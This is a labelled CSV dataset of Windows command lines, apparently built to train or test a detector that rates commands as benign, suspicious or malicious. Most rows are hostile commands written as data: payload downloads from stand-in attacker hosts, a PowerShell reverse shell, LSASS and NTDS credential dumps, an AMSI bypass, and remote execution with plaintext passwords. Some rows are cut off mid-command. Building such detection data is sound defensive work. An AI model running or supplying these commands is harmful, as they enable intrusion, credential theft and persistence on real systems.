Prompt,Label,Type
ieexec.exe http://11.11.11.11:8080/bypass.exe,Suspicious,command
ilasm.exe C:\\public\\test.txt /exe,Malicious,command
InfDefaultInstall.exe Infdefaultinstall.inf,Suspicious,command
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Suspicious,command
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Suspicious,command
jsc.exe scriptfile.js,Suspicious,command
makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab,Suspicious,command
makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab,Suspicious,command
makecab \\\\10.10.10.10\\webdav\\file.exe C:\\Folder\\file.cab,Malicious,command
MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll,Malicious,command
"Mavinject.exe 4172 /INJECTRUNNING ""c:\\ads\\file.txt:file.dll""",Malicious,command
Microsoft.Workflow.Compiler.exe tests.xml results.xml,Suspicious,command
Microsoft.Workflow.Compiler.exe tests.txt results.txt,Suspicious,command
mmc.exe -Embedding c:\\path\\to\\test.msc,Malicious,command
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe,Malicious,command
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe,Malicious,command
msbuild.exe pshell.xml,Suspicious,command
msbuild.exe project.csproj,Suspicious,command
Msconfig.exe -5,Benign,command
msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE,Malicious,command
msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE,Malicious,command
mshta.exe evilfile.hta,Suspicious,command
"mshta.exe ""C:\\ads\\file.txt:file.hta""",Suspicious,command
msiexec /quiet /i cmd.msi,Suspicious,command
netsh.exe add helper C:\\Users\\User\\file.dll,Malicious,command
odbcconf -f file.rsp,Suspicious,command
pcalua.exe -a calc.exe,Suspicious,command
Pcwrun.exe c:\\temp\\beacon.exe,Suspicious,command
pktmon.exe start --etw,Benign,command
pnputil.exe -i -a C:\\Users\\hai\\Desktop\\mo.inf,Malicious,command
Presentationhost.exe C:\\temp\\Evil.xbap,Suspicious,command
print /D:C:\\ADS\\File.txt:file.exe C:\\ADS\\File.exe,Malicious,command
print /D:C:\\ADS\\CopyOfFile.exe C:\\ADS\\FileToCopy.exe,Malicious,command
psr.exe /start /output D:\\test.zip /sc 1 /gui 0,Suspicious,command
rasautou -d powershell.dll -p powershell -a a -e e,Malicious,command
reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg,Malicious,command
regasm.exe AllTheThingsx64.dll,Suspicious,command
regasm.exe /U AllTheThingsx64.dll,Suspicious,command
regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey,Malicious,command
regini.exe newfile.txt:hidden.ini,Suspicious,command
"Register-cimprovider -path ""C:\\folder\\evil.dll""",Malicious,command
regsvcs.exe AllTheThingsx64.dll,Suspicious,command
regsvcs.exe AllTheThingsx64.dll,Suspicious,command
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,Malicious,command
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,Malicious,command
replace.exe C:\\Source\\File.cab C:\\Destination /A,Suspicious,command
replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A,Suspicious,command
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM,Benign,command
rundll32.exe AllTheThingsx64,Benign,command
"rundll32 ""C:\\ads\\file.txt:ADSDLL.dll""",Suspicious,command
Runonce.exe /AlternateShellStartup,Benign,command
runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test,Malicious,command
"sc create evilservice binPath=""\\""c:\\\\ADS\\\\file.txt:cmd.exe\\"" /c echo works > \\""c:\\ADS\\works.txt\\"""" DisplayName= ""evilservice"" start= auto\\ & sc start evilservice",Malicious,command
"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr c:\\some\\directory\\revshell.exe",Malicious,command
Scriptrunner.exe -appvscript calc.exe,Suspicious,command
"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""",Malicious,command
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""C:/Windows/System32/calc.exe""",Malicious,command
tttracer.exe C:\\windows\\system32\\calc.exe,Suspicious,command
TTTracer.exe -dumpFull -attach pid,Benign,command
vbc.exe /target:exe c:\\temp\\vbs\\run.vb,Malicious,command
verclsid.exe /S /C {CLSID},Suspicious,command
wab.exe,Benign,command
"wmic.exe process call create ""c:\\ads\\file.txt:program.exe""",Malicious,command
wmic.exe process call create calc,Suspicious,command
wscript c:\\ads\\file.txt:script.vbs,Suspicious,command
wsreset.exe,Benign,command
wuauclt.exe /UpdateDeploymentProvider <Full_Path_To_DLL> /RunHandlerComServer,Malicious,command
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},Suspicious,command
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM,Malicious,command
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://10.10.10.10/raw/iLxUT5gM,Malicious,command
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://11.11.11.11/raw/iLxUT5gM,Malicious,command
rundll32.exe advpack.dll,Suspicious,command
rundll32.exe advpack.dll,Suspicious,command
"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump ""[LSASS_PID] dump.bin full""",Suspicious,command
rundll32.exe ieadvpack.dll,Suspicious,command
rundll32.exe ieadvpack.dll,Suspicious,command
rundll32.exe ieframe.dll,Suspicious,command
rundll32.exe Mshtml.dll,Suspicious,command
rundll32.exe pcwutl.dll,Suspicious,command
rundll32.exe setupapi.dll,Suspicious,command
rundll32.exe setupapi.dll,Suspicious,command
rundll32.exe shdocvw.dll,Suspicious,command
rundll32.exe shell32.dll,Suspicious,command
rundll32.exe syssetup.dll,Suspicious,command
rundll32 syssetup.dll,Suspicious,command
rundll32.exe url.dll,Suspicious,command
rundll32.exe zipfldr.dll,Suspicious,command
adplus.exe -hang -pn lsass.exe -o c:\\users\\mr.d0x\\output\\folder -quiet,Malicious,command
"AgentExecutor.exe -powershell ""c:\\temp\\Malicious.ps1"" ""c:\\temp\\test.log"" ""c:\\temp\\test1.log"" ""c:\\temp\\test2.log"" 60000 ""C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0"" 0 1",Malicious,command
AppVLP.exe \\\\webdav\\calc.bat,Suspicious,command
AppVLP.exe \\\\10.10.10.10\\calc.bat,Malicious,command
bginfo.exe bginfo.bgi /popup /nolicprompt,Suspicious,command
bginfo.exe bginfo.bgi /popup /nolicprompt,Suspicious,command
cdb.exe -cf x64_calc.wds -o notepad.exe,Suspicious,command
coregon.exe.exe /L C:\\folder\\evil.dll dummy_assembly_name,Malicious,command
coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name,Malicious,command
csi.exe file,Suspicious,command
"DefaultPack.EXE /C:""process.exe args""",Suspicious,command
"devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] ""argument here"" test",Suspicious,command
dnx.exe consoleapp,Benign,command
dotnet.exe [PATH_TO_DLL],Suspicious,command
dotnet.exe [PATH_TO_DLL],Suspicious,command
Dxcap.exe -c C:\\Windows\\System32\\notepad.exe,Malicious,command
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll,Malicious,command
Mftrace.exe cmd.exe,Suspicious,command
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""",Malicious,command
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""",Malicious,command
msxsl.exe customers.xml script.xsl,Suspicious,command
msxsl.exe customers.xml script.xsl,Suspicious,command
"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\\"" q q",Malicious,command
"Powerpnt.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",Malicious,command
"Powerpnt.exe ""http://193.168.1.10/TeamsAddinLoader.dll""",Malicious,command
"Powerpnt.exe ""http://amaare.mere/TeamsAddinLoader.dll""",Suspicious,command
rcsi.exe bypass.csx,Suspicious,command
rcsi.exe bypass.csx,Suspicious,command
"Remote.exe /s ""powershell.exe"" anythinghere",Suspicious,command
"Remote.exe /s ""powershell.exe"" anythinghere",Suspicious,command
sqldumper.exe 464 0 0x0110,Suspicious,command
Sqlps.exe -noprofile,Benign,command
SQLToolsPS.exe -noprofile -command Start-Process calc.exe,Suspicious,command
squirrel.exe --download [http://10.10.10.1],Malicious,command
squirrel.exe --download [http://11.1.1.1],Malicious,command
squirrel.exe --download [http://nice.domain],Malicious,command
squirrel.exe --update [http://10.10.10.1],Malicious,command
squirrel.exe --update [http://11.1.1.1],Malicious,command
squirrel.exe --update [http://nice.domain],Malicious,command
te.exe bypass.wsc,Suspicious,command
Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe,Malicious,command
Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe,Malicious,command
Update.exe --download [http:/nice.domain],Malicious,command
Update.exe --download [http://11.10.10.1],Malicious,command
Update.exe --download [http://10.10.10.1],Malicious,command
Update.exe --update=[http://10.10.10.1],Malicious,command
Update.exe --update=[http://11.10.10.1],Malicious,command
Update.exe --update=[http:/nice.domain],Malicious,command
Vsjitdebugger.exe calc.exe,Benign,command
"winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",Malicious,command
wsl.exe -e /mnt/c/Windows/System32/calc.exe,Malicious,command
wsl.exe --exec bash -c \'cat < /dev/tcp/192.168.1.10/54 > binary\',Malicious,command
. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess calc.ps1,Malicious,command
. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1   \\nSyncInvoke <executable> [args],Malicious,command
set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf,Malicious,command
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,Malicious,command
pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct,Malicious,command
pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct,Malicious,command
reg.exe import c:\\path\\to\\Slmgr.reg & cscript.exe /b c:\\windows\\system32\\slmgr.vbs,Malicious,command
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""",Malicious,command
"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985",Malicious,command
%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,Malicious,command
"Pester.bat [/help|?|-?|/?] ""$null; notepad""",Suspicious,command
"C:\Python27\python.exe -c ""(lambda __y",Malicious,command
"C:\Python27\python.exe -c ""(lambda __y",Malicious,command
"ruby -rsocket -e 'c=TCPSocket.new(""10.0.0.1""",Suspicious,command
"ruby -rsocket -e 'c=TCPSocket.new(""11.0.0.1""",Suspicious,command
lua5.1 -e 'local host,Suspicious,command
lua5.1 -e 'local host,Suspicious,command
powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001,Malicious,command
powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 11.0.0.2 3001,Malicious,command
psexec \\test.domain -u Domain\User -p Password ipconfig,Suspicious,command
psexec \\10.10.10.10 -u Domain\User -p Password ipconfig,Suspicious,command
sc \\host.domain create ExampleService binpath= “c:\windows\system32\calc.exe”,Malicious,command
sc \\10.10.10.10 create ExampleService binpath= “c:\windows\system32\calc.exe”,Malicious,command
sc \\10.10.10.10 start ExampleService,Malicious,command
sc \\host.domain start ExampleService,Malicious,command
"wmic /node:target.domain /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exe”",Malicious,command
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\System32\calc.exe”",Malicious,command
winrs -r:EXAMPLE.lab.local -u:DOMAIN\user -p:password calc.exe,Suspicious,command
winrs -r:10.10.10.10 -u:DOMAIN\user -p:password calc.exe,Malicious,command
schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System,Malicious,command
schtasks /run /tn ExampleTask /S host.domain,Malicious,command
schtasks /run /tn ExampleTask /S 10.10.10.10,Malicious,command
schtasks /F /delete /tn ExampleTask /S host.domain,Malicious,command
schtasks /F /delete /tn ExampleTask /S 10.10.10.10,Malicious,command
MSBuild.exe \\host.domain\path\to\XMLfile.xml,Suspicious,command
MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml,Suspicious,command
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml,Suspicious,command
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml,Suspicious,command
"wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\LAB2012DC01.LAB.local\C$\Windows\Temp\build.xml""",Suspicious,command
"wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml""",Malicious,command
copy C:\Users\Administrator\Downloads\build.xml \\10.10.10.10\C$\Windows\Temp\,Malicious,command
"wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml""",Suspicious,command
"wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create ""c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml""",Malicious,command
"psexec \\host.domain -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\host.domain\C$\Windows\Temp\build.xml""",Malicious,command
"psexec \\10.10.10.10 -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml""",Malicious,command
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""",Suspicious,command
"powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.Application""",Suspicious,command
copy C:\Windows\Temp\Malice.exe \\10.10.10.10\C$\Windows\Temp,Malicious,command
"wmic /node:target.domain /user:domain\user /password:password process call create ""C:\Windows\Temp\Malice.exe”",Malicious,command
"wmic /node:10.10.10.10 /user:domain\user /password:password process call create ""C:\Windows\Temp\Malice.exe”",Malicious,command
mshta.exe http://Malicious.domain/runme.hta,Suspicious,command
mshta.exe http://11.10.10.10/runme.hta,Malicious,command
mshta.exe http://10.10.10.10/runme.hta,Malicious,command
"rundll32.exe javascript:""..\mshtml",Suspicious,command
"rundll32.exe javascript:""..\mshtml",Suspicious,command
rundll32.exe url.dll,Suspicious,command
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll,Malicious,command
regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll,Malicious,command
regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll,Malicious,command
powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',Malicious,command
"powershell [Delegate]::CreateDelegate((""Func``3[String",Suspicious,command
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1'),Malicious,command
powershell IEX (New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.obs.ps1'),Malicious,command
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET',Suspicious,command
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET',Suspicious,command
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""",Malicious,command
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://193.168.119.155/PowerUp.ps1""",Malicious,command
"powershell Invoke-WebRequest ""http://10.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe""",Malicious,command
"powershell Invoke-WebRequest ""http://11.10.16.7/Rev.exe"" -OutFile ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe""",Malicious,command
powershell $bytes = [System.Text.Encoding]::Unicode.GetBytes($command),Suspicious,command
powershell $encodedCommand = [Convert]::ToBase64String($bytes),Suspicious,command
powershell Get-DomainUser | select -ExpandProperty cn,Benign,command
powershell Get-DomainUser | select -ExpandProperty cn,Benign,command
powershell Get-DomainComputer,Benign,command
powershell Get-ForestDomain,Benign,command
powershell Get-DomainTrust,Benign,command
powershell Get-ForestTrust,Benign,command
"powershell Get-DomainGroup ""Domain Admins""",Suspicious,command
"powershell Get-DomainGroupMember ""Domain Admins"" | select -ExpandProperty membername",Suspicious,command
powershell Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC,Benign,command
powershell Get-DomainOU -FullData,Benign,command
powershell Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname,Suspicious,command
powershell Get-DomainOU *WS* | select gplink,Suspicious,command
"powershell Get-DomainGPO -Name ""{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}""",Benign,command
powershell Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName,Suspicious,command
"powershell Get-DomainObjectAcl -SearchBase ""CN=Policies",Suspicious,command
"powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq ""GP-Link"" -and $_.ActiveDirectoryRights -match ""WriteProperty"" } | select ObjectDN",Suspicious,command
"powershell Get-DomainObjectAcl -SamAccountName ""Domain Admins"" -ResolveGUIDs | Select IdentityReference",Suspicious,command
